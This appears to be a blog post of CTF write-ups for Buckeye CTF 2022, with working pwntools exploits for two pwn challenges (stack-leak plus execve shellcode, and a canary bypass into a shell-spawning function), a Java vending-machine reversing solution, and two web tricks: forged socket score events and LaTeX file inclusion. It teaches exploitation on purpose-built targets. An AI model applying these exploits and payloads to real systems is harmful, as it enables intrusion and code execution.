---
layout: post
title: "Buckeye CTF 2022"
---

## ronin (pwn)
We're given the source:
```
#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>

char* txt[] = {
    "After defeating the great Haku in battle, our hero begins the journey home.\nThe forest is covered in thick brush. It is difficult to see where you are going...\nBut a samurai always knows the way home, and with a sharp sword that can cut through the foliage, there is nothing to worry about.\n...\n...suddenly, the sword is gone. It has been swept straight out of your hand!\nYou look up to see a monkey wielding your sword! What will you do? ",
    "Yes, of course. You are a great warrior! This monkey doesn't stand a chance.\nWith your inner strength, you leap to the trees, chasing the fleeing monkey for what feels like hours.\n",
    "The monkey, with great speed, quickly disappears into the trees. You have lost your sword and any hopes of getting home...\n",
    "Eventually, you lose sight of it. It couldn't have gotten far. Which way will you look? ",
    "Finally, the monkey stops and turns to you.\n\"If you wish for your weapon back, you must make me laugh.\" Holy shit. This monkey can talk. \"Tell me a joke.\" ",
    "\"BAAAAHAHAHAHAHA WOW THAT'S A GOOD ONE. YOU'RE SO FUNNY, SAMURAI.\n...NOT! THAT JOKE SUCKED!\"\nThe monkey proceeds to launch your sword over the trees. The throw was so strong that it disappeard over the horizon.\nWelp. It was a good run.\n",
};

void scroll(char* txt) {
    size_t len = strlen(txt);
    for(size_t i = 0; i < len; i++) {
        char c = txt[i];
        putchar(c);
        usleep((c == '\n' ? 1000 : 50) * 1000);
    }
}

void encounter() {
    while(getchar() != '\n') {}
    scroll(txt[4]);
    char buf2[32]; //rbp-32
    fgets(buf2, 49, stdin);
    scroll(txt[5]);
}

void search(char* area, int dir) {
    scroll(area);
    if(dir == 2) {
        encounter();
        exit(0);
    }
}

void chase() {
    char* locs[] = {
        "The treeline ends, and you see beautiful mountains in the distance. No monkey here.\n",
        "Tall, thick trees surround you. You can't see a thing. Best to go back.\n",
        "You found the monkey! You continue your pursuit.\n",
        "You find a clearing with a cute lake, but nothing else. Turning around.\n",
    };
    scroll(txt[3]);
    int dir;
    while(1) {
        scanf("%d", &dir);
        if(dir > 3) {
            printf("Nice try, punk\n");
        } else {
            search(locs[dir], dir);
        }
    }
}

int main() {
    setvbuf(stdout, 0, 2, 0);

    scroll(txt[0]);
    char buf1[80];
    fgets(buf1, 80, stdin);
    if(strncmp("Chase after it.", buf1, 15) == 0) {
        scroll(txt[1]);
        chase();
    } else {
        scroll(txt[2]);
    }
}
```

Running `checksec` reveals that there's no `NX`:

```
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX disabled
PIE:      PIE enabled
RWX:      Has RWX segments
```

Additionally, there is a buffer overflow in `encounter`, where we can overflow `rip` but nothing beyond it. We probably need to jump to the buffer to execute shellcode. How do we leak the address of the buffer? After all, ASLR is enabled.

Notice that in `chase`, the lower bound is not checked for the `dir` variable. In other words, we can input a negative number for `dir` and potentially call `search` on a pointer to a pointer, which could leak a stack address.

Messing around in `gdb` and trying random stuff, we find that `-4` consistently leaks an address on the stack (probably `rbp` from a different stack frame). It turns out that this address is at a constant offset from the buffer we care about.

Therefore, the plan is: 1) call `chase` with `-4` as the input, then leak the stack address, 2) call `encounter`, input shellcode, padding, then the address of the buffer (to overwrite the stored `rip`).

```
from pwn import *

r = remote("pwn.chall.pwnoh.io", 13372)
r.recvuntil(b"? ")
r.sendline("Chase after it.")
r.recvuntil("? ")
r.sendline("-4")
rbp_addr = u64(r.recvuntil(b"\x7f") + b"\x00\x00")
buf_addr = rbp_addr - 224
sc = bytes.fromhex("31f648bb2f62696e2f2f73685653545f6a3b5831d20f05")
r.sendline("2")
r.recvuntil('ke." ')
r.sendline(sc + b"A"*17 + p64(buf_addr))

r.interactive()
```

This gives us a shell, which in turn gives us the flag: `buckeye{n3v3r_7ru57_4_741k1n9_m0nk3y}`.

## stack duck (pwn)
We're given the source:

```
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

volatile long DuckCounter;

__attribute__((noinline))
void win() {
    system("/bin/sh");
}

__attribute__((noinline))
void submit_code() {
    char temp_code[512];

    printf("Please enter your code. Elon will review it for length.\n");
    fgets(temp_code, 552, stdin);
}

__attribute__((noinline))
int menu() {
    printf("Twitter Employee Performance Review\n");
    printf("***********************************\n\n");
    printf("1. Submit code for approval\n");
    printf("2. Get fired\n");

    return 0;
}

int main() {
    setvbuf(stdout, 0, 2, 0);
    int run = 1;
    while (run) {
        char buf[0x20];
        menu();
        fgets(buf, 0x20, stdin);
        int choice = atoi(buf);
        switch (choice) {
            case 1:
                submit_code();
                break;
            case 2:
                run = 0;
                break;
            default:
                break;
        }
    }
    return 0;
}
```

There's a buffer overflow in `submit_code`, but there's a stack canary for each function. There isn't an obvious way to leak the canary, so we turn to the assembly.

```
0x00000000004011e2 <+66>:    mov    rax,QWORD PTR ds:0x404080
0x00000000004011ea <+74>:    add    rax,0x1
0x00000000004011ee <+78>:    mov    QWORD PTR ds:0x404080,rax
0x00000000004011f6 <+86>:    and    rax,0x1f
0x00000000004011fa <+90>:    cmp    rax,0x1e
0x00000000004011fe <+94>:    je     0x40120e <submit_code+110>
0x0000000000401204 <+100>:    jmp    0x401228 <submit_code+136>
```

In `submit_code`, the canary is incorrectly implemented. The register `rax` holds `DuckCounter` (it gets incremented by 1 every time `submit_code` is called), and if it's equal to `0x1e==30`, it jumps to `submit_code+110`. Let's look at that.

```
=> 0x000000000040120e <+110>:    mov    rax,QWORD PTR fs:0x28
   0x0000000000401217 <+119>:    mov    rcx,QWORD PTR [rbp-0x8]
   0x000000000040121b <+123>:    cmp    al,cl
   0x000000000040121d <+125>:    je     0x40123e <submit_code+158>
   0x0000000000401223 <+131>:    jmp    0x401209 <submit_code+105>
```

The compare is only done against the low byte of the canary (`cmp al, cl`)! The low byte is always zero so this function will return successfully. To summarize: call `submit_code` 29 times to set `DuckCounter` to the desired value, and on the 30th call, the canary effectively disappears. Then, just overflow the buffer and return to `win`.

```
from pwn import *
import struct

def p32(x):
    return struct.pack('<I', x)
def u32(x):
    return struct.unpack('<I', x)[0]
def p64(x):
    return struct.pack('Q', x)
def u64(x):
    return struct.unpack('Q', x)[0]

if __name__ == '__main__':
    debug = False

    if debug:
        p = process(['./glibc/ld-linux-x86-64.so.2', './chall'], env={'LD_PRELOAD': './glibc/libc.so.6'})
    else:
        p = remote('pwn.chall.pwnoh.io', 13386)

    # bypass canary by repeating function 29 times (on the 30th, only low byte of canary will be compared)

    for i in range(29):
        print(p.recvuntil(b'fired'))
        p.sendline(b'1')

        print(p.recvuntil(b'length.'))
        p.sendline(b'poop')
    
    print(p.recvuntil(b'fired'))
    p.sendline(b'1')

    print(p.recvuntil(b'length.'))

    # note that address of win is actually past the function prologue
    p.sendline(b'A'*520 + p64(0x0) + p64(0x0) + p64(0x0000000000401184))

    p.interactive()
```

Flag: `buckeye{if_it_quacks_like_a_duck_it_might_not_be_a_duck}`

## soda (rev)
Using a Java decompiler, we can see the source:

```
import java.io.BufferedReader;
import java.io.FileReader;
import java.util.Scanner;

// get the most expensive drink and drop it

public class soda {
  static final int NUM_DRINKS = 12;
  
  static float wallet = 5.0F;
  
  public static void main(String[] paramArrayOfString) {
    VendingMachine vendingMachine = new VendingMachine();
    Scanner scanner = new Scanner(System.in);
    System.out.println("\nThe prophecy states that worthy customers receive flags in their cans...");
    while (true) {
      System.out.println("\n" + vendingMachine);
      System.out.println(String.format("I have $%.02f in my wallet", new Object[] { Float.valueOf(wallet) }));
      System.out.print("command> ");
      try {
        String str = scanner.nextLine();
        if (str.isEmpty())
          break; 
        String[] arrayOfString = str.split(" ");
        processCommand(vendingMachine, arrayOfString);
      } catch (Exception exception) {
        break;
      } 
    } 
    System.out.println();
    scanner.close();
  }
  
  private static void processCommand(VendingMachine paramVendingMachine, String[] paramArrayOfString) {
    // purchase [n between 1 and 12]
    // buys the drink at index i-1
    if (paramArrayOfString[0].equalsIgnoreCase("purchase")) {
      if (paramArrayOfString.length > 1)
        try {
          int i = Integer.parseInt(paramArrayOfString[1]);
          if (i < 1 || i > 12)
            throw new RuntimeException(); 
          paramVendingMachine.buy(i - 1);
          return;
        } catch (Exception exception) {
          System.out.println(">> That's not a real choice");
          return;
        }  
      System.out.println(">> Purchase what?");
      return;
    } 
    
    // reach
    // calls reach (which updates STUCK->DROPPED)
    if (paramArrayOfString[0].equalsIgnoreCase("reach")) {
      if (bystanders) {
        System.out.println(">> I can't do that with people around!\n>> They'll think I'm stealing!");
        return;
      } 
      
      int i = paramVendingMachine.reach();
      paramVendingMachine.dropped += i;
      if (i > 0) {
        System.out.println(">> Ok, here goes... gonna reach through the door and try to knock it down...");
        pause(3);
        System.out.println(">> !!! I heard something fall!");
      } else {
        System.out.println(">> There's nothing to reach for");
      } 
      return;
    } 
    
    // call tap
    if (paramArrayOfString[0].equalsIgnoreCase("tap")) {
      System.out.println(">> Tapping the glass is harmless, right?");
      pause(1);
      paramVendingMachine.tap();
      System.out.println(">> Not sure if that helped at all...");
      return;
    } 

    if (paramArrayOfString[0].equalsIgnoreCase("wait")) {
      int i = 0;
      try {
        i = Integer.parseInt(paramArrayOfString[1]);
      } catch (Exception exception) {
        System.out.println(">> Not sure what you mean");
        return;
      } 
      pause(i);
      if (i >= 10) {
        bystanders = false;
        System.out.println(">> ...Looks like nobody's around...");
      } else {
        bystanders = true;
        System.out.println(">> People are walking down the street.");
      } 
      return;
    } 

    // call retrieve
    if (paramArrayOfString[0].equalsIgnoreCase("grab")) {
      if (paramVendingMachine.dropped > 0) {
        System.out.println(">> Alright!! Let's see what I got!");
        paramVendingMachine.retrieve();
      } else {
        System.out.println(">> There's nothing to grab...");
      } 
      return;
    } 
    System.out.println(">> Not sure what you mean");
  }
  
  // print the flag
  private static void printFlag() {
    try {
      BufferedReader bufferedReader = new BufferedReader(new FileReader("flag.txt"));
      System.out.println(">> WOAH!! There's a flag in here!!");
      String str;
      while ((str = bufferedReader.readLine()) != null)
        System.out.println(str); 
    } catch (Exception exception) {
      System.out.println(">> You find a piece of paper in the can! It reads:");
      System.out.println("\n\t\"You are not worthy\"\n");
    } 
  }
  
  // pause for paramInt seconds
  private static void pause(int paramInt) {
    try {
      for (byte b = 0; b < paramInt; b++) {
        System.out.print(". ");
        Thread.sleep(1000L);
      } 
    } catch (Exception exception) {}
    System.out.println();
  }
  
  static class VendingMachine {
    soda.Drink[] drinks = new soda.Drink[12];
    
    public int dropped = 0;
    
    public VendingMachine() {
      for (byte b = 0; b < 12; b++)
        this.drinks[b] = new soda.Drink(); 
    }
    
    // returns whether any drinks are DROPPED
    public boolean hasDroppedDrinks() {
      for (byte b = 0; b < 12; b++) {
        if ((this.drinks[b]).status == soda.Drink.DrinkStatus.DROPPED)
          return true; 
      } 
      return false;
    }
    
    // buy a drink
    // drink must be READY, soda.wallet > drink.cost
    // effects: READY->STUCK and soda.wallet -= drink.cost
    public void buy(int param1Int) {
      if ((this.drinks[param1Int]).status != soda.Drink.DrinkStatus.READY) {
        System.out.println(">> [OUT OF STOCK]");
        return;
      } 
      if (soda.wallet > (this.drinks[param1Int]).cost) {
        System.out.println(">> [VENDING]");
        soda.pause(5);
        System.out.println(">> ...Wait... IT'S STUCK?? NOOOOOO");
        (this.drinks[param1Int]).status = soda.Drink.DrinkStatus.STUCK;
        soda.wallet -= (this.drinks[param1Int]).cost;
        return;
      } 
      System.out.println(">> I don't have enough money :(");
    }
    
    // Decrements stuck count (helpful for transitioning from STUCK->DROPPED)
    public void tap() {
      for (byte b = 0; b < 12; b++) {
        if ((this.drinks[b]).status == soda.Drink.DrinkStatus.STUCK && (this.drinks[b]).stuck > 0)
          (this.drinks[b]).stuck--; 
      } 
    }
    
    // Return the number of DROPPED drinks (a STUCK drink becomes DROPPED if drink.stuck == 0)
    // Transitions from STUCK -> DROPPED
    public int reach() {
      byte b1 = 0;
      for (byte b2 = 0; b2 < 12; b2++) {
        if ((this.drinks[b2]).status == soda.Drink.DrinkStatus.STUCK && (this.drinks[b2]).stuck == 0) {
          (this.drinks[b2]).status = soda.Drink.DrinkStatus.DROPPED;
          b1++;
        } 
      } 
      return b1;
    }
    
    public void retrieve() {
      byte indexOfDrinkWithMaxCost = -1;
      float maxCost = -1.0F;

      // Find the highest cost drink that isn't EMPTY
      for (byte b1 = 0; b1 < 12; b1++) {
        if ((this.drinks[b1]).status != soda.Drink.DrinkStatus.EMPTY && 
          (this.drinks[b1]).cost > maxCost) {
            indexOfDrinkWithMaxCost = b1;
            maxCost = (this.drinks[b1]).cost;
        } 
      } 
      
      // Print the flag if the highest cost drink that isn't EMPTY is DROPPED
      if ((this.drinks[indexOfDrinkWithMaxCost]).status == soda.Drink.DrinkStatus.DROPPED) {
        soda.printFlag();
      } else {
        System.out.println(">> No flags in here... was the prophecy a lie...?");
      } 
    }
    
    public String toString() {
      String str = "-------".repeat(6) + "-\n";
      byte b;
      for (b = 0; b < 6; b++) {
        for (byte b1 = 0; b1 < 6; b1++)
          str = str + str; 
        str = str + "|\n";
      } 
      str = str + str + "-\n";
      for (b = 0; b < 6; b++) {
        for (byte b1 = 6; b1 < 12; b1++)
          str = str + str; 
        str = str + "|\n";
      } 
      str = str + str + "-\n";
      return str;
    }
  }
  
  // every drink has cost and status (25% chance EMPTY, 75% READY)
  static class Drink {
    float cost = (float)(Math.random() * 6.0D);
    
    DrinkStatus status = (Math.random() > 0.75D) ? DrinkStatus.EMPTY : DrinkStatus.READY;
    
    int stuck = 3;
    
    public String getCostLabel() {
      return String.format("%1.02f", new Object[] { Float.valueOf(this.cost) });
    }
    
    public String[] asText(int param1Int) {
      String[] arrayOfString = { "| " + param1Int + ((param1Int < 10) ? "    " : "   "), "|      ", "|      ", "|      ", "|      ", "| " + getCostLabel() + " " };
      if (this.status != DrinkStatus.EMPTY && this.status != DrinkStatus.DROPPED)
        return new String[] { "| " + param1Int + (
            
            (param1Int < 10) ? "    " : "   "), "|  __  ", 
            
            (this.status == DrinkStatus.STUCK) ? "| |**| " : "| |  | ", "| |__| ", "|      ", "| " + 
            
            getCostLabel() + " " }; 
      return arrayOfString;
    }
    
    enum DrinkStatus {
      EMPTY, READY, STUCK, DROPPED;
    }
  }
  
  enum DrinkStatus {
    EMPTY, READY, STUCK, DROPPED;
  }
}
```

To get the flag, we need to set the highest cost drink's status to be `DROPPED`:
```
if ((this.drinks[indexOfDrinkWithMaxCost]).status == soda.Drink DrinkStatus.DROPPED) {
    soda.printFlag();
}
```
But since we only have $5.00, we have to get lucky with our drinks. For example, the following would work:
```
-------------------------------------------
| 1    | 2    | 3    | 4    | 5    | 6    |
|      |  __  |  __  |  __  |      |  __  |
|      | |  | | |  | | |  | |      | |  | |
|      | |__| | |__| | |__| |      | |__| |
|      |      |      |      |      |      |
| 0.24 | 3.99 | 0.83 | 2.82 | 0.85 | 2.56 |
-------------------------------------------
| 7    | 8    | 9    | 10   | 11   | 12   |
|      |  __  |  __  |  __  |  __  |  __  |
|      | |  | | |  | | |  | | |  | | |  | |
|      | |__| | |__| | |__| | |__| | |__| |
|      |      |      |      |      |      |
| 0.05 | 1.61 | 4.56 | 1.61 | 3.54 | 3.26 |
-------------------------------------------

I have $5.00 in my wallet
command> purchase 9
```

In this example, we need to purchase the 9th drink, which puts it in the `STUCK` state. To change it to `DROPPED`, we need to call `tap` 3 times, which goes through all the drinks in the vending machine and decrements the `stuck` field by one each time it's called.

```
public void tap() {
    for (byte b = 0; b < 12; b++) {
    if ((this.drinks[b]).status == soda.Drink.DrinkStatus.STUCK && (this.drinks[b]).stuck > 0)
        (this.drinks[b]).stuck--; 
    } 
}
```

At this point, we can call `reach`, but there's a problem:
```
if (bystanders) {
    System.out.println(">> I can't do that with people around!\n>> They'll think I'm stealing!");
    return;
}
```
The `processCommand` method checks if `bystanders` is true, and if so, it just returns without calling `retrieve`. It turns out that the `wait` command will change this variable, if we pause for at least 10 seconds:

```
pause(i);
if (i >= 10) {
    bystanders = false;
    System.out.println(">> ...Looks like nobody's around...");
}
```

After this, we can do the `retrieve` command to set the soda to `DROPPED`, then do `grab` to call the `printFlag` function.

Flag: `buckeye{w3_c411_7h3_s7uff_"p0p"_h3r3}`

## pong (web)
There's an unbeatable Pong AI, and the goal is to win 10 matches before the opponent. The AI just follows the ball's y position exactly, so it always hits it. Clearly, we must win by other means. We can look at the game's JavaScript source, which has a few `socket.emit` calls.

```
if(bx < -.1 || bx > 1.1) {
    socket.emit("score", bx);
}
```

It looks like scoring is done when the ball goes out of bounds, where the ball's x position (`bx`) is passed to determine who scored. Thus, we can make our own `socket.emit` calls, where `bx` is set to something really high.

The following code gives us the flag:
```
for (let i = 0; i < 10; i++)
    socket.emit('score', 1000);
```

Flag: `buckeye{1f_3v3ry0n3_ch3475_175_f41r}`

## textual (web)

There's a file inclusion vulnerability, where simply including another LaTeX file will display it. Typing in `\include{flag.tex}` and compiling it reveals the flag.

Flag: `buckeye{w41t_3v3n_l4t3x_15_un54f3}`
